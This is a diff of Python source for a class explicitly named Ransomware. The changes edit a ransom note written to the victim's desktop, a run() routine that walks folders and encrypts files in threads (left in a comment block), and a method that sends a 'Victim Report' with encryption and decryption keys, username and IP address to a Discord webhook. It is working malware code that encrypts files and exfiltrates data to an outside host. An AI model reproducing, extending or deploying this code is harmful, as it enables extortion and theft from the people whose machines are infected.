@@ -80,7 +80,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
     def readMe(self):                               # defines method within class
         try:                                        # start of try block
             with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt", "w+") as f: # opens file in r+w mode, if doesnt exit, will create it
-                f.write(note)                       # writes the content of the note
+                f.write(ransomNote)                       # writes the content of the note
         except Exception as e:                      # error catch
             print(f"Error writing readme.txt: {e}")
             
@@ -104,8 +104,8 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
             print(f"Error encrypting {file}: {e}")
 
     # Main method for ransomware functionality
-    '''
-    def run(self):
+
+    '''def run(self):
         self.sendMessage()
         for root, directories, files in os.walk(self.filePath):
             for filename in files:
@@ -114,9 +114,11 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
                     if base in filepath:
                         threading.Thread(target=self.encryptFile, args=(filepath,)).start()
 
-        self.readMe()
+        self.readMe()'''
+
+
     
-        '''
+
 
     # Send message to Discord Webhook with victim details 
     def sendMessage(self):
@@ -124,29 +126,35 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
             self.getUserDetails()
         except Exception as e:
             print(f"Error getting user details for sending message: {e}")
+
         data = {
             "embeds": [
                 {
                     "title": "**__Victim Report__:**",
-                    "description": f"```css\nUSERID: {self.randomId}``` ```css\nKEY: {self.encryptionPass}``` "
-                                   f"```css\nUSERNAME: {self.userName}``` ```css\nIP: {self.ip}```",
+                    "description": (
+                        f"```css\nUSERID: {self.randomId}``` "
+                        f"```css\nENCRYPTION KEY: {self.encryptionPass}``` "
+                        f"```css\nDECRYPTION KEY: {self.decryptionPass}``` "
+                        f"```css\nUSERNAME: {self.userName}``` "
+                        f"```css\nIP: {self.ip}```"
+                    ),
                     "color": 13959168,
                     "thumbnail": {
                         "url": "https://www.pngkit.com/png/full/168-1680567_69137579-pentagram-with-demon-baphomet-satanic-goat.png"
                     },
                     "author": {
-                        "name": "Hummus",
+                        "name": "Scrypt",
                         "icon_url": "https://i.imgur.com/F3j7z5K.png"
                     }
                 }
             ]
         }
+
         try:
             r = requests.post(discordWebhook, json=data)
         except Exception as e:
             print(f"Error sending message to Discord webhook: {e}")
-    
-        
+
     # Generate random string for encryption password
     def rSeed(self, stringLength):
         password_characters = string.ascii_letters
